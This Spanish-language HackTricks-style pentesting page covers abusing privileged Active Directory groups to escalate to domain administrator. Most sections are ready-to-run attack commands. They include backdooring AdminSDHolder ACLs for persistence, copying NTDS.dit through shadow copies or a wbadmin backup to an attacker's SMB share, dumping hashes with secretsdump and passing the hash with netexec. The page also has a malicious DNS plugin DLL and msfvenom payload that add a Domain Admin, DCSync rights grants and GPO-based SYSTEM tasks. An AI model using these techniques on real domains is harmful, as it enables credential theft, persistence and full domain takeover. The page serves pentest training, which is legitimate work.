# Grupos privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos conocidos con privilegios de administración

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Este grupo tiene permiso para crear cuentas y grupos que no sean administradores en el dominio. Además, permite iniciar sesión localmente en el controlador de dominio (DC).

Para identificar a los miembros de este grupo, se ejecuta el siguiente comando:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Se permite agregar nuevos usuarios, así como iniciar sesión localmente en el DC.<sup>[[1]](#references)</sup>

Una ruta condicional desde la administración de cuentas hasta el acceso de administrador local es un **grupo ordinario delegado para leer la contraseña LAPS de un equipo**. Comprueba los derechos efectivos de escritura de membresía en ese grupo concreto, si está protegido y si una cuenta nueva o controlada puede realmente unirse a él. Actualiza el token de la cuenta antes de probar el permiso de lectura de LAPS en el equipo de destino. En el caso de Windows LAPS cifrado, el permiso de lectura en el directorio y la autoridad para descifrar la contraseña son requisitos distintos; pertenecer a un grupo o ser miembro de Account Operators no otorga ninguno de los dos por sí solo. Consulta [el alcance de Account Operators según Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) y [la delegación de Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Grupo AdminSDHolder

La lista de control de acceso (ACL) del grupo **AdminSDHolder** es crucial, ya que establece los permisos de todos los «grupos protegidos» de Active Directory, incluidos los grupos con privilegios elevados. Este mecanismo garantiza la seguridad de estos grupos al impedir modificaciones no autorizadas.

Un atacante podría aprovechar esto modificando la ACL del grupo **AdminSDHolder** para otorgar permisos completos a un usuario estándar. Esto le daría a ese usuario control total sobre todos los grupos protegidos. Si los permisos de este usuario se modifican o eliminan, se restablecerán automáticamente en el plazo de una hora debido al diseño del sistema.<sup>[[14]](#references)</sup>

La documentación reciente de Windows Server sigue considerando varios grupos de operadores integrados como objetos **protegidos** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). El proceso **SDProp** se ejecuta en el **PDC Emulator** cada 60 minutos de forma predeterminada, establece `adminCount=1` y deshabilita la herencia en los objetos protegidos. Esto resulta útil tanto para la persistencia como para buscar usuarios privilegiados obsoletos que fueron eliminados de un grupo protegido, pero aún conservan la ACL sin herencia.<sup>[[12]](#references)</sup>

Los comandos para revisar los miembros y modificar los permisos incluyen:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Hay un script disponible para agilizar el proceso de restauración: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para obtener más detalles, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

La visibilidad de los objetos eliminados depende de los permisos efectivos del directorio; el nombre de un grupo por sí solo no demuestra que la identidad actual pueda enumerar o restaurar un objeto. AD Recycle Bin debe haberse habilitado antes de la eliminación para permitir una restauración completa, que también requiere Reanimate-Tombstones en la raíz del contexto de nomenclatura, permisos para cambiar el nombre y CREATE_CHILD en el contenedor de destino. [La guía de Microsoft sobre Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) y [las reglas de autorización para recuperar objetos eliminados](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) distinguen estas condiciones. Una identidad autorizada con acceso de lectura a los objetos eliminados puede inspeccionar registros que podrían revelar información confidencial:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Esto resulta útil para **recuperar rutas de privilegios anteriores**. Los objetos eliminados todavía pueden exponer `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPN antiguos o el DN de un grupo privilegiado eliminado que otro operador pueda restaurar más adelante.

Los atributos definidos por la aplicación también pueden conservar material de credenciales antiguo mientras un objeto permanece en estado eliminado. Trátalo como una pista de revisión independiente: la identidad actual debe tener permiso para enumerar el objeto eliminado **y** leer ese atributo, el valor debe ser una credencial utilizable y una entidad principal que siga activa debe aceptarla. La pertenencia a un grupo o el nombre de una cuenta eliminada, por sí solos, no prueban ninguno de esos pasos; evita mostrar valores de credenciales durante la enumeración rutinaria. [La documentación de Microsoft sobre la Papelera de reciclaje](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) describe la conservación de atributos tras la eliminación.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Acceso al controlador de dominio

El acceso a los archivos del DC está restringido, a menos que el usuario pertenezca al grupo `Server Operators`, lo que cambia el nivel de acceso.

### Escalada de privilegios

Con `PsService` o `sc` de Sysinternals, se pueden inspeccionar y modificar los permisos de los servicios. Por ejemplo, el grupo `Server Operators` tiene control total sobre ciertos servicios, lo que permite ejecutar comandos arbitrarios y escalar privilegios:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Este comando revela que `Server Operators` tiene acceso total, lo que permite manipular servicios para obtener privilegios elevados.

## Backup Operators

La pertenencia a `Backup Operators` puede otorgar `SeBackupPrivilege` y `SeRestorePrivilege` en un host, según la directiva local y la sesión de inicio de sesión. Comprueba el **token efectivo del proceso que ejecuta los comandos** con `whoami /groups` y `whoami /priv`: la pertenencia por sí sola no demuestra que `SeBackupPrivilege` esté presente y habilitado. Si el privilegio está presente, pero deshabilitado, puede habilitarse en ese token; si está ausente o se ha eliminado, estas operaciones de backup no pueden usarlo. `SeBackupPrivilege` permite realizar **lecturas** protegidas mediante API compatibles con backup (por ejemplo, `FILE_FLAG_BACKUP_SEMANTICS` o `robocopy /B`); `SeRestorePrivilege` es un privilegio independiente para operaciones de restauración/escritura. Los listados y las copias normales de directorios no necesariamente usan la semántica de backup.<sup>[[1]](#references)</sup>

Para listar los miembros del grupo, ejecuta:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Ataque local

En un host donde el token efectivo tiene `SeBackupPrivilege`, la siguiente copia compatible con backups puede leer un archivo protegido:

1. Importa las bibliotecas necesarias:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Si el privilegio está presente pero deshabilitado, habilítalo y verifica su estado en este proceso:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Copia un archivo de un directorio restringido, por ejemplo:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### Ataque a AD

`NTDS.dit` es la base de datos de Active Directory en un **controlador de dominio (DC)**. Esta ruta requiere un token adecuado en el DC y acceso al volumen que contiene la base de datos; pertenecer a Backup Operators en otro lugar no concede acceso a un DC específico. Normalmente, la base de datos activa está bloqueada, así que usa una copia shadow accesible u otro recurso de copia de seguridad antes de copiarla. La creación o exposición de una copia shadow también depende de la configuración de VSS del host y de los permisos del usuario que la solicita. El ejemplo siguiente asume que el DC almacena `NTDS.dit` en `C:`, bajo `\Windows\NTDS`; ajusta el volumen y la ruta si no es así.

#### Uso de diskshadow.exe

1. Si está permitido, crea y expón una copia shadow de la unidad `C:` del DC como `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Copia `NTDS.dit` desde la copia sombra:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Como alternativa, usa `robocopy` para copiar archivos:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Guarda el hive `SYSTEM` del DC para extraerlo sin conexión. `SAM` es la base de datos de cuentas locales en los sistemas miembro; el hive `SAM` de un DC no sustituye a `NTDS.dit` ni es una fuente del hash del Administrator del dominio:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Transfiere `ntds.dit` y `SYSTEM.SAV` al host de análisis y extrae los hashes de las cuentas del dominio. Un hive `SAM` guardado de un sistema miembro, junto con su hive `SYSTEM` correspondiente, proporciona los hashes de las cuentas locales:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Si se recuperó un hash de **Administrator** del **dominio** desde `NTDS.dit`, se puede probar para autenticarse en el dominio. Un hash de Administrator local de `SAM.SAV` es una credencial distinta y no permite autenticarse como Administrator del dominio.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Uso de wbadmin.exe

1. Configura un sistema de archivos NTFS para el servidor SMB en la máquina del atacante y almacena en caché las credenciales SMB en la máquina objetivo.
2. Usa `wbadmin.exe` para realizar una copia de seguridad del sistema y extraer `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Para ver una demostración práctica, consulta [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Los miembros del grupo **DnsAdmins** pueden aprovechar sus privilegios para cargar una DLL arbitraria con privilegios de SYSTEM en un servidor DNS, que a menudo está alojado en Controladores de Dominio. Esta capacidad ofrece un potencial de explotación significativo.

Para enumerar los miembros del grupo DnsAdmins, usa:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Ejecutar una DLL arbitraria (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidad permite ejecutar código arbitrario con privilegios SYSTEM en el servicio DNS (normalmente dentro de los DC). Este problema se corrigió en 2021.

Los miembros pueden hacer que el servidor DNS cargue una DLL arbitraria (local o desde un recurso compartido remoto) mediante comandos como:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Es necesario reiniciar el servicio DNS (lo que puede requerir permisos adicionales) para que se cargue la DLL:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Para obtener más detalles sobre este vector de ataque, consulta ired.team.

#### Mimilib.dll

También es posible usar mimilib.dll para ejecutar comandos, modificándola para ejecutar comandos específicos o reverse shells. [Consulta esta publicación](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para obtener más información.<sup>[[15]](#references)</sup>

### Registro WPAD para MitM

DnsAdmins puede manipular los registros DNS para realizar ataques Man-in-the-Middle (MitM), creando un registro WPAD después de deshabilitar la lista global de bloqueo de consultas. Se pueden usar herramientas como Responder o Inveigh para suplantar identidades y capturar el tráfico de red.

### Event Log Readers
Los miembros pueden acceder a los registros de eventos y posiblemente encontrar información confidencial, como contraseñas en texto claro o detalles sobre la ejecución de comandos:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Este grupo puede modificar las DACL del objeto de dominio y, potencialmente, conceder privilegios de DCSync. Las técnicas de escalada de privilegios que aprovechan este grupo se detallan en el repo de GitHub Exchange-AD-Privesc.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Si puedes actuar como miembro de este grupo, el abuso clásico consiste en conceder a una entidad controlada por el atacante los permisos de replicación necesarios para [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Históricamente, **PrivExchange** encadenaba el acceso a buzones, la autenticación forzada de Exchange y el relay LDAP para obtener este mismo primitivo. Aunque esa ruta de relay esté mitigada, pertenecer directamente a `Exchange Windows Permissions` o controlar un servidor Exchange sigue siendo una vía de alto valor para obtener derechos de replicación del dominio.

## Hyper-V Administrators

Los miembros de Hyper-V Administrators tienen acceso completo a Hyper-V, lo que se puede explotar para tomar el control de controladores de dominio virtualizados. Esto incluye clonar DCs activos y extraer hashes NTLM del archivo NTDS.dit.

### Ejemplo de explotación

En la práctica, el abuso suele consistir en **acceder sin conexión a los discos o puntos de control de los DCs**, en lugar de recurrir a los antiguos trucos de LPE a nivel del host. Con acceso al host de Hyper-V, un operador puede crear un punto de control o exportar un controlador de dominio virtualizado, montar el VHDX y extraer `NTDS.dit`, `SYSTEM` y otros secretos sin tocar LSASS dentro del invitado:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Desde allí, reutiliza el flujo de trabajo de `Backup Operators` para copiar `Windows\NTDS\ntds.dit` y los hives del registro sin conexión. Flujo de trabajo relacionado para archivos de backup:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Este grupo permite a sus miembros crear Group Policies en el dominio. Sin embargo, sus miembros no pueden aplicar Group Policies a usuarios o grupos ni editar GPO existentes.

El matiz importante es que **quien crea una GPO se convierte en su propietario** y normalmente obtiene suficientes permisos para editarla después. Eso significa que este grupo resulta interesante cuando puedes:

- crear una GPO maliciosa y convencer a un administrador para que la vincule a una OU/dominio objetivo
- editar una GPO que hayas creado y que ya esté vinculada en un lugar útil
- abusar de otro permiso delegado que te permita vincular GPO, mientras que este grupo te da permisos de edición

En la práctica, el abuso suele consistir en añadir un **Immediate Task**, un **startup script**, un cambio de **local admin membership** o una modificación de **user rights assignment** mediante archivos de política respaldados por SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Si editas la GPO manualmente a través de `SYSVOL`, recuerda que el cambio por sí solo no es suficiente: también deben actualizarse `versionNumber`, `GPT.ini` y, a veces, `gPCMachineExtensionNames`; de lo contrario, los clientes ignorarán la actualización de la directiva.<sup>[[9]](#references)</sup>

## Administración de la organización

En entornos donde está implementado **Microsoft Exchange**, un grupo especial conocido como **Organization Management** cuenta con capacidades importantes. Este grupo tiene privilegios para **acceder a los buzones de todos los usuarios del dominio** y mantiene **control total sobre la Unidad organizativa (OU) 'Microsoft Exchange Security Groups'**. Este control incluye el grupo **`Exchange Windows Permissions`**, que puede explotarse para la escalada de privilegios.

### Explotación de privilegios y comandos

#### Print Operators

Los miembros del grupo **Print Operators** cuentan con varios privilegios, incluido **`SeLoadDriverPrivilege`**, que les permite **iniciar sesión localmente en un Domain Controller**, apagarlo y administrar impresoras. Para explotar estos privilegios, especialmente si **`SeLoadDriverPrivilege`** no está visible en un contexto sin elevación, es necesario omitir User Account Control (UAC).<sup>[[1]](#references)</sup>

Para enumerar los miembros de este grupo, se usa el siguiente comando de PowerShell:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

En los Domain Controllers, este grupo es peligroso porque la directiva predeterminada de Domain Controller concede **`SeLoadDriverPrivilege`** a `Print Operators`. Si consigues un token elevado de un miembro de este grupo, puedes habilitar el privilegio y cargar un driver firmado pero vulnerable para escalar al kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Para obtener detalles sobre el manejo de tokens, consulta [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Los miembros de este grupo tienen acceso a los equipos mediante Remote Desktop Protocol (RDP). Para enumerar a estos miembros, puedes usar comandos de PowerShell:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Puede encontrar más información sobre la explotación de RDP en recursos especializados de pentesting.

#### Remote Management Users

Los miembros pueden acceder a equipos mediante **Windows Remote Management (WinRM)**. La Enumeration de estos miembros se realiza mediante:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Para las técnicas de explotación relacionadas con **WinRM**, se debe consultar la documentación específica.

#### Server Operators

Este grupo tiene permisos para realizar varias configuraciones en los controladores de dominio, incluidos privilegios de copia de seguridad y restauración, cambiar la hora del sistema y apagarlo.<sup>[[1]](#references)</sup> Para enumerar los miembros, se proporciona el siguiente comando:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

En los controladores de dominio, `Server Operators` suelen heredar suficientes permisos para **reconfigurar servicios o iniciarlos/detenerlos**, y también reciben `SeBackupPrivilege`/`SeRestorePrivilege` mediante la directiva predeterminada de los DC. En la práctica, esto los convierte en un puente entre el **abuso del control de servicios** y la **extracción de NTDS**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

No poder enumerar servicios no descarta el acceso a un **servicio conocido**. Service Control Manager comprueba `SC_MANAGER_ENUMERATE_SERVICE` para enumerarlos, por separado de `SC_MANAGER_CONNECT`; abrir un servicio por nombre comprueba sus propios permisos, incluidos `SERVICE_CHANGE_CONFIG` y `SERVICE_START`. Revisa el token efectivo y la ACL de ese servicio, incluso si falla una consulta general con `sc.exe query`. Tener solo permisos de configuración es únicamente un indicio: la identidad del servicio, los permisos de inicio y detención, y un activador utilizable siguen determinando si es posible una transición a privilegios superiores. Consulta la [referencia de Microsoft sobre los derechos de acceso a los servicios](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Si la ACL de un servicio concede a este grupo permisos para cambiar su configuración e iniciarlo, configura el servicio para que ejecute un comando arbitrario, inícialo como `LocalSystem` y luego restaura el `binPath` original. Si el control de servicios está restringido, recurre a las técnicas de `Backup Operators` anteriores para copiar `NTDS.dit`.

## References

- [1] [ired.team – Cuentas privilegiadas y privilegios de token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abuso de SeLoadDriverPrivilege para la escalada de privilegios](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abuso de permisos de GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Abuso de GPO, parte 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Guía de un Red Teamer sobre GPO y OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Función ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP anónimo → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Apéndice C: Cuentas y grupos protegidos en Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Cómo abusar de AdminSDHolder y crear una puerta trasera para obtener persistencia como Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abuso del privilegio DnsAdmins para escalar privilegios en Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Información sobre el abuso de la relación GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Función NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
